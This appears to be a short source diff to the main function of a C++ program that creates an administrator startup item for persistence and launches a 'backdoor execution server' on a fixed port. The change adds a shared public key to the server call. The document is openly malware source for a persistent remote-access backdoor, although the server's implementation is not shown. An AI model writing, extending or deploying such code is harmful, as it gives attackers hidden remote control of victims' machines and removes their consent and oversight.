@@ -4,6 +4,7 @@
 #include <AdminStartupItem.hpp>
 #include <CombaseLibrary.hpp>
 #include <BackdoorExecution.hpp>
+#include <SharedConstants.hpp>
 
 #include <iostream>
 #include <ios>
@@ -47,7 +48,10 @@ int main()
         std::cout << "Created startup item successfully" << std::endl;
 
         // Start the backdoor execution server
-        BackdoorExecution{}.Serve(g_program_is_stopping, 19284 /*Seems like a good number, why not?*/);
+        BackdoorExecution{}.Serve(
+            g_program_is_stopping,
+            19284 /*Seems like a good port number, why not?*/,
+            g_public_key);
     }
     catch (std::exception& e)
     {
